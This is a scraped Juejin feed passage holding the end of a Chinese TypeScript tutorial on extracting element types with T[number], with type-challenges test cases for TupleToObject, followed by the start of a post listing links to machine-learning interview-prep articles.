<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 定义普通数组类型</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">StringArr</span> = <span class="hljs-built_in">string</span>[];
<span class="hljs-keyword">type</span> <span class="hljs-title class_">NumberArr</span> = <span class="hljs-built_in">number</span>[];
<span class="hljs-keyword">type</span> <span class="hljs-title class_">BoolArr</span> = <span class="hljs-built_in">boolean</span>[];

<span class="hljs-comment">// T[number] 提取元素类型</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Str</span> = <span class="hljs-title class_">StringArr</span>[<span class="hljs-built_in">number</span>]; <span class="hljs-comment">// 结果：string</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Num</span> = <span class="hljs-title class_">NumberArr</span>[<span class="hljs-built_in">number</span>]; <span class="hljs-comment">// 结果：number</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Bool</span> = <span class="hljs-title class_">BoolArr</span>[<span class="hljs-built_in">number</span>]; <span class="hljs-comment">// 结果：boolean</span>

<span class="hljs-comment">// 等价于直接注解类型</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">s</span>: <span class="hljs-title class_">Str</span> = <span class="hljs-string">"hello"</span>; <span class="hljs-comment">// 等同于 let s: string</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">n</span>: <span class="hljs-title class_">Num</span> = <span class="hljs-number">123</span>;    <span class="hljs-comment">// 等同于 let n: number</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">b</span>: <span class="hljs-title class_">Bool</span> = <span class="hljs-literal">true</span>;  <span class="hljs-comment">// 等同于 let b: boolean</span>
</code></pre>
<ol start="2">
<li>元组类型</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 定义一个多类型的元组类型</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Tuple</span> = [<span class="hljs-number">123</span>, <span class="hljs-string">"TS"</span>, <span class="hljs-literal">true</span>, <span class="hljs-literal">null</span>];

<span class="hljs-comment">// T[number] 提取所有元素的联合类型</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">TupleUnion</span> = <span class="hljs-title class_">Tuple</span>[<span class="hljs-built_in">number</span>]; <span class="hljs-comment">// 结果：123 | "TS" | true | null</span>

<span class="hljs-comment">// 变量注解：可以是联合类型中的任意一种</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">val</span>: <span class="hljs-title class_">TupleUnion</span>;
val = <span class="hljs-number">123</span>;    <span class="hljs-comment">// 合法</span>
val = <span class="hljs-string">"TS"</span>;   <span class="hljs-comment">// 合法</span>
val = <span class="hljs-literal">true</span>;   <span class="hljs-comment">// 合法</span>
val = <span class="hljs-literal">null</span>;   <span class="hljs-comment">// 合法</span>
val = <span class="hljs-literal">false</span>;  <span class="hljs-comment">// ❌ 报错：不在联合类型中</span>
</code></pre>
<ol start="3">
<li>字面量元组</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 字面量元组：元素是数字/字符串字面量</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">StatusTuple</span> = [<span class="hljs-number">200</span>, <span class="hljs-number">404</span>, <span class="hljs-number">500</span>];
<span class="hljs-keyword">type</span> <span class="hljs-title class_">EnvTuple</span> = [<span class="hljs-string">"dev"</span>, <span class="hljs-string">"test"</span>, <span class="hljs-string">"prod"</span>];

<span class="hljs-comment">// 转字面量联合类型（开发中常用的枚举式类型）</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Status</span> = <span class="hljs-title class_">StatusTuple</span>[<span class="hljs-built_in">number</span>]; <span class="hljs-comment">// 结果：200 | 404 | 500</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Env</span> = <span class="hljs-title class_">EnvTuple</span>[<span class="hljs-built_in">number</span>];       <span class="hljs-comment">// 结果："dev" | "test" | "prod"</span>

<span class="hljs-comment">// 严格限制变量值，避免手写错误</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">code</span>: <span class="hljs-title class_">Status</span> = <span class="hljs-number">200</span>; <span class="hljs-comment">// 合法</span>
code = <span class="hljs-number">404</span>;             <span class="hljs-comment">// 合法</span>
code = <span class="hljs-number">403</span>;             <span class="hljs-comment">// ❌ 报错：403 不在 200|404|500 中</span>

<span class="hljs-keyword">let</span> <span class="hljs-attr">env</span>: <span class="hljs-title class_">Env</span> = <span class="hljs-string">"dev"</span>;   <span class="hljs-comment">// 合法</span>
env = <span class="hljs-string">"prod"</span>;           <span class="hljs-comment">// 合法</span>
env = <span class="hljs-string">"production"</span>;     <span class="hljs-comment">// ❌ 报错：不在联合类型中</span>
</code></pre>
<ol start="4">
<li><code>as const</code> + 数组 + <code>T[number]</code></li>
</ol>
<p>同时拥有数组的可遍历性 + 联合类型的严格类型约束。</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 步骤1：用 as const 断言数组为「只读字面量元组」</span>
<span class="hljs-comment">// 作用：让 TS 保留每个元素的字面量类型，且把数组转为只读元组（不可修改）</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">EnvArr</span> = [<span class="hljs-string">"dev"</span>, <span class="hljs-string">"test"</span>, <span class="hljs-string">"prod"</span>] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>;
<span class="hljs-keyword">const</span> <span class="hljs-title class_">StatusArr</span> = [<span class="hljs-number">200</span>, <span class="hljs-number">404</span>, <span class="hljs-number">500</span>] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>;

<span class="hljs-comment">// 步骤2：用 typeof 获取数组的类型（只读字面量元组类型）</span>
<span class="hljs-comment">// 补充：typeof 是 TS 关键字，用于「从变量中提取其类型」</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">EnvTuple</span> = <span class="hljs-keyword">typeof</span> <span class="hljs-title class_">EnvArr</span>; <span class="hljs-comment">// 类型：readonly ["dev", "test", "prod"]</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">StatusTuple</span> = <span class="hljs-keyword">typeof</span> <span class="hljs-title class_">StatusArr</span>; <span class="hljs-comment">// 类型：readonly [200, 404, 500]</span>

<span class="hljs-comment">// 步骤3：用 T[number] 转成字面量联合类型</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Env</span> = <span class="hljs-title class_">EnvTuple</span>[<span class="hljs-built_in">number</span>]; <span class="hljs-comment">// 结果："dev" | "test" | "prod"</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Status</span> = <span class="hljs-title class_">StatusTuple</span>[<span class="hljs-built_in">number</span>]; <span class="hljs-comment">// 结果：200 | 404 | 500</span>

<span class="hljs-comment">// 简化写法（开发中常用，省略中间元组类型）</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">EnvSimplify</span> = <span class="hljs-keyword">typeof</span> <span class="hljs-title class_">EnvArr</span>[<span class="hljs-built_in">number</span>];
<span class="hljs-keyword">type</span> <span class="hljs-title class_">StatusSimplify</span> = <span class="hljs-keyword">typeof</span> <span class="hljs-title class_">StatusArr</span>[<span class="hljs-built_in">number</span>];
</code></pre>
<ol start="5">
<li>泛型中使用 <code>T[number]</code></li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 泛型 T 约束为「只读数组」（兼容 as const 断言的数组）</span>
<span class="hljs-keyword">function</span> getUnionType&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-keyword">readonly</span> <span class="hljs-built_in">any</span>[]&gt;(<span class="hljs-attr">arr</span>: T): T[<span class="hljs-built_in">number</span>] {
  <span class="hljs-keyword">return</span> arr[<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * arr.<span class="hljs-property">length</span>)];
}

<span class="hljs-comment">// 传入 as const 断言的数组，返回值自动推导为字面量联合类型</span>
<span class="hljs-keyword">const</span> res1 = <span class="hljs-title function_">getUnionType</span>([<span class="hljs-string">"dev"</span>, <span class="hljs-string">"test"</span>, <span class="hljs-string">"prod"</span>] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>); <span class="hljs-comment">// res1 类型："dev" | "test" | "prod"</span>
<span class="hljs-keyword">const</span> res2 = <span class="hljs-title function_">getUnionType</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>); <span class="hljs-comment">// res2 类型：1 | 2 | 3</span>

<span class="hljs-comment">// 传入普通数组，返回值推导为基础类型</span>
<span class="hljs-keyword">const</span> res3 = <span class="hljs-title function_">getUnionType</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]); <span class="hljs-comment">// res3 类型：number</span>
</code></pre>
<ol start="6">
<li>支持嵌套数组 / 元组</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> <span class="hljs-title class_">NestedArr</span> = [[<span class="hljs-number">1</span>, <span class="hljs-string">"a"</span>], [<span class="hljs-number">2</span>, <span class="hljs-string">"b"</span>]] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>;
<span class="hljs-keyword">type</span> <span class="hljs-title class_">NestedUnion</span> = <span class="hljs-keyword">typeof</span> <span class="hljs-title class_">NestedArr</span>[<span class="hljs-built_in">number</span>]; <span class="hljs-comment">// 结果：readonly [1, "a"] | readonly [2, "b"]</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">DeepUnion</span> = <span class="hljs-keyword">typeof</span> <span class="hljs-title class_">NestedArr</span>[<span class="hljs-built_in">number</span>][<span class="hljs-built_in">number</span>]; <span class="hljs-comment">// 结果：1 | "a" | 2 | "b"</span>
</code></pre>
<h3 data-id="heading-10">测试用例</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">/* _____________ 测试用例 _____________ */</span>
<span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> { <span class="hljs-title class_">Equal</span>, <span class="hljs-title class_">Expect</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@type-challenges/utils'</span>

<span class="hljs-keyword">const</span> tuple = [<span class="hljs-string">'tesla'</span>, <span class="hljs-string">'model 3'</span>, <span class="hljs-string">'model X'</span>, <span class="hljs-string">'model Y'</span>] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>
<span class="hljs-keyword">const</span> tupleNumber = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>
<span class="hljs-keyword">const</span> sym1 = <span class="hljs-title class_">Symbol</span>(<span class="hljs-number">1</span>)
<span class="hljs-keyword">const</span> sym2 = <span class="hljs-title class_">Symbol</span>(<span class="hljs-number">2</span>)
<span class="hljs-keyword">const</span> tupleSymbol = [sym1, sym2] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>
<span class="hljs-keyword">const</span> tupleMix = [<span class="hljs-number">1</span>, <span class="hljs-string">'2'</span>, <span class="hljs-number">3</span>, <span class="hljs-string">'4'</span>, sym1] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>

<span class="hljs-keyword">type</span> cases = [
  <span class="hljs-title class_">Expect</span>&lt;<span class="hljs-title class_">Equal</span>&lt;<span class="hljs-title class_">TupleToObject</span>&lt;<span class="hljs-keyword">typeof</span> tuple&gt;, { <span class="hljs-string">'tesla'</span>: <span class="hljs-string">'tesla'</span>, <span class="hljs-string">'model 3'</span>: <span class="hljs-string">'model 3'</span>, <span class="hljs-string">'model X'</span>: <span class="hljs-string">'model X'</span>, <span class="hljs-string">'model Y'</span>: <span class="hljs-string">'model Y'</span> }&gt;&gt;,
  <span class="hljs-title class_">Expect</span>&lt;<span class="hljs-title class_">Equal</span>&lt;<span class="hljs-title class_">TupleToObject</span>&lt;<span class="hljs-keyword">typeof</span> tupleNumber&gt;, { <span class="hljs-number">1</span>: <span class="hljs-number">1</span>, <span class="hljs-number">2</span>: <span class="hljs-number">2</span>, <span class="hljs-number">3</span>: <span class="hljs-number">3</span>, <span class="hljs-number">4</span>: <span class="hljs-number">4</span> }&gt;&gt;,
  <span class="hljs-title class_">Expect</span>&lt;<span class="hljs-title class_">Equal</span>&lt;<span class="hljs-title class_">TupleToObject</span>&lt;<span class="hljs-keyword">typeof</span> tupleSymbol&gt;, { [sym1]: <span class="hljs-keyword">typeof</span> sym1, [sym2]: <span class="hljs-keyword">typeof</span> sym2 }&gt;&gt;,
  <span class="hljs-title class_">Expect</span>&lt;<span class="hljs-title class_">Equal</span>&lt;<span class="hljs-title class_">TupleToObject</span>&lt;<span class="hljs-keyword">typeof</span> tupleMix&gt;, { <span class="hljs-number">1</span>: <span class="hljs-number">1</span>, <span class="hljs-string">'2'</span>: <span class="hljs-string">'2'</span>, <span class="hljs-number">3</span>: <span class="hljs-number">3</span>, <span class="hljs-string">'4'</span>: <span class="hljs-string">'4'</span>, [sym1]: <span class="hljs-keyword">typeof</span> sym1 }&gt;&gt;,
]

<span class="hljs-comment">// @ts-expect-error</span>
<span class="hljs-keyword">type</span> error = <span class="hljs-title class_">TupleToObject</span>&lt;[[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>], {}]&gt;

</code></pre>
<h3 data-id="heading-11">相关链接</h3>
<blockquote>
<p>分享你的解答：<a href="https://link.juejin.cn?target=https%3A%2F%2Ftsch.js.org%2F11%2Fanswer%2Fzh-CN" target="_blank" title="https://tsch.js.org/11/answer/zh-CN" ref="nofollow noopener noreferrer">tsch.js.org/11/answer/z…</a>
查看解答：<a href="https://link.juejin.cn?target=https%3A%2F%2Ftsch.js.org%2F11%2Fsolutions" target="_blank" title="https://tsch.js.org/11/solutions" ref="nofollow noopener noreferrer">tsch.js.org/11/solution…</a>
更多题目：<a href="https://link.juejin.cn?target=https%3A%2F%2Ftsch.js.org%2Fzh-CN" target="_blank" title="https://tsch.js.org/zh-CN" ref="nofollow noopener noreferrer">tsch.js.org/zh-CN</a></p>
</blockquote>
<p>下面是我的公众号，欢迎关注。关注后有新的功能点会及时收到推送。</p>
<blockquote>
<p>实战为王！专注于汇总各种功能点，致力于打造一系列能够帮助工程师实现各种功能的想法思路的优质文章。</p>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4bdeec99a0154e7aa73c1c6765f3dcf0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZnhzcw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770391205&amp;x-signature=BePhgA1vquk1pj8MgVekhcJIeOM%3D" alt="前端功能点" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[机器学习八股超全内容！！！]]></title>    <link>https://juejin.cn/post/7600787795478331438</link>    <guid>https://juejin.cn/post/7600787795478331438</guid>    <pubDate>2026-01-30T15:44:56.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600787795478331438" data-draft-id="7600787795478315054" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="机器学习八股超全内容！！！"/> <meta itemprop="keywords" content="面试,算法"/> <meta itemprop="datePublished" content="2026-01-30T15:44:56.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="aicoting"/> <meta itemprop="url" content="https://juejin.cn/user/933911964427818"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            机器学习八股超全内容！！！
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/933911964427818/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    aicoting
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T15:44:56.000Z" title="Fri Jan 30 2026 15:44:56 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>推荐直接网站在线阅读：<a href="https://link.juejin.cn?target=https%3A%2F%2Faicoting.cn%2F" target="_blank" title="https://aicoting.cn/" ref="nofollow noopener noreferrer">aicoting |AI算法面试学习</a></p>
</blockquote>
<p>前面我们介绍了机器学习中的所有知识点，从最开始确定机器学习知识库知识体系框架，到编写内容，再到最后的排版，前前后后三个月的时间，终于机器学习知识库和大家见面，知识库中从机器学习的定义，到数学与理论基础，再到数据与特征工程，再到监督学习方法、无监督学习方法、半监督学习方法、强化学习，最后再到模型评估，我尽量涵盖了机器学习所有的经典内容。</p>
<p>并且为了帮助大家更好的理解，其中绝大部分知识点都编写了示例代码，大家可以结合进行学习。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/129446fbff6f4f42aa7215373840ef43~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYWljb3Rpbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770392695&amp;x-signature=wHx7wWI1fZE%2FCghUr%2FyJ96FMRxY%3D" alt="" loading="lazy"/></p>
<p>添加图片注释，不超过 140 字（可选）</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8ec80d5629b24dcbb75ea318469259e5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYWljb3Rpbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770392695&amp;x-signature=9DjiPh%2BTgBj5uSRGypHG%2B0zNffc%3D" alt="" loading="lazy"/></p>
<p>添加图片注释，不超过 140 字（可选）</p>
<p>如果你看到了这里，你可以在脑袋里回忆一下机器学习的知识框架，每个条目里都有什么知识点你还记得吗？这个知识点你大概全都理解了吗？是不是已经掌握了？面试官如果问我我能清晰的回答出来吗？</p>
<p>如果上面的答案全都是yes，那么恭喜你，你已经为深度学习和AI大模型打下了坚实的基础，更深层次的学习不会比从0到1更困难了！</p>
<p>这个知识库到这里并没有结束，我后续会进行持续更新，如果大家觉得有什么经典的知识点或者面试常问的知识点我没有讲到，欢迎在下方留言！！！</p>
<p>我把机器学习的所有文章均列在了下方，供大家随时阅读。</p>
<h2 data-id="heading-0">机器学习概述和数学基础</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1984777337598936630" target="_blank" title="https://zhuanlan.zhihu.com/p/1984777337598936630" ref="nofollow noopener noreferrer">一文搞懂机器学习入门知识！</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1985464409682884606" target="_blank" title="https://zhuanlan.zhihu.com/p/1985464409682884606" ref="nofollow noopener noreferrer">一文搞懂机器学习线性代数基础知识！</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1985843315665556596" target="_blank" title="https://zhuanlan.zhihu.com/p/1985843315665556596" ref="nofollow noopener noreferrer">一文搞懂机器学习中的优化方法！</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1986214900901631235" target="_blank" title="https://zhuanlan.zhihu.com/p/1986214900901631235" ref="nofollow noopener noreferrer">机器学习中的学习理论</a></p>
<h2 data-id="heading-1">数据与特征工程</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1986571005150393573" target="_blank" title="https://zhuanlan.zhihu.com/p/1986571005150393573" ref="nofollow noopener noreferrer">机器学习中的数据预处理方法大全！</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1986937774515966052" target="_blank" title="https://zhuanlan.zhihu.com/p/1986937774515966052" ref="nofollow noopener noreferrer">机器学习特征工程中的特征选择</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1987286853355860184" target="_blank" title="https://zhuanlan.zhihu.com/p/1987286853355860184" ref="nofollow noopener noreferrer">一文搞懂机器学习中的特征构造！</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1987671291134775527" target="_blank" title="https://zhuanlan.zhihu.com/p/1987671291134775527" ref="nofollow noopener noreferrer">一文搞懂机器学习中的特征降维！</a></p>
<h2 data-id="heading-2">监督学习方法</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1988209749930570714" target="_blank" title="https://zhuanlan.zhihu.com/p/1988209749930570714" ref="nofollow noopener noreferrer">万字长文！回归模型最全讲解！</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1988220820246528878" target="_blank" title="https://zhuanlan.zhihu.com/p/1988220820246528878" ref="nofollow noopener noreferrer">万字长文！一文搞懂监督学习中的分类模型！</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1988607240530310302" target="_blank" title="https://zhuanlan.zhihu.com/p/1988607240530310302" ref="nofollow noopener noreferrer">一文搞懂树模型与集成模型</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1989117049310573686" target="_blank" title="https://zhuanlan.zhihu.com/p/1989117049310573686" ref="nofollow noopener noreferrer">一文搞懂监督学习中的集成学习！</a></p>
<h2 data-id="heading-3">无监督学习方法</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1989476470503016400" target="_blank" title="https://zhuanlan.zhihu.com/p/1989476470503016400" ref="nofollow noopener noreferrer">一文搞懂K-Means 聚类！</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1991660950718277623" target="_blank" title="https://zhuanlan.zhihu.com/p/1991660950718277623" ref="nofollow noopener noreferrer">K-Medoids聚类方法和K-Means有什么区别？</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1993096866754221035" target="_blank" title="https://zhuanlan.zhihu.com/p/1993096866754221035" ref="nofollow noopener noreferrer">一文搞懂层次聚类和密度聚类方法！</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1993373759931954886" target="_blank" title="https://zhuanlan.zhihu.com/p/1993373759931954886" ref="nofollow noopener noreferrer">一文搞懂机器学习中的PCA主成分分析！</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1993671061439549575" target="_blank" title="https://zhuanlan.zhihu.com/p/1993671061439549575" ref="nofollow noopener noreferrer">机器学习中独立成分分析ICA和主成分分析PCA有什么区别？</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1994189802527014929" target="_blank" title="https://zhuanlan.zhihu.com/p/1994189802527014929" ref="nofollow noopener noreferrer">一文搞懂t-SNE和UMAP降维方法！</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1994553416505116303" target="_blank" title="https://zhuanlan.zhihu.com/p/1994553416505116303" ref="nofollow noopener noreferrer">万字长文！搞懂机器学习中的概率图模型</a></p>
<h2 data-id="heading-4">半监督与强化学习</h2>
